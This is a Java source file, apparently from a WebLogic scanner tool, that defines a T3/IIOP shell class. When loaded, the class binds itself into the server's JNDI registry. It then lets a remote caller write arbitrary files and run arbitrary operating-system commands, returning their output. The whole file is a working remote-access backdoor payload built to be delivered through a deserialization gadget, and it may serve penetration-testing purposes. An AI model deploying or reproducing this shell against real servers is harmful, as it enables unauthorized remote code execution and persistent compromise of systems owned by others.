package com.gbw.scanner.plugins.scripts.weblogic.shell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.BASE64Decoder;
import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.rmi.RemoteException;

public class GBWT3IIOPShell extends AbstractTranslet implements ClusterMasterRemote {
    static {
        try{
            Context ctx = new InitialContext();
            ctx.rebind("sectest", new GBWT3IIOPShell());
        }catch (Exception e){

            e.printStackTrace();
        }
    }
    //上传文件
    @Override
    public void setServerLocation(String path, String text) throws RemoteException {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            fileOutputStream.write(new BASE64Decoder().decodeBuffer(text));
            fileOutputStream.flush();
            fileOutputStream.close();
        }catch (Exception e) {

        }
    }
    //执行命令
    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {
            if (cmd.equals("unbind")) {
                Context ctx = new InitialContext();
                ctx.unbind("sectest");
                return null;
            } else{
                String name = System.getProperty("os.name");
                String[] cmds = name != null && name.toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                byte[] buf = new byte[1024];
                int len = 0;
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                while ((len = in.read(buf)) != -1) {
                    out.write(buf, 0, len);
                }
                return new String(out.toByteArray());
            }

        }catch (Exception e){

        }
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
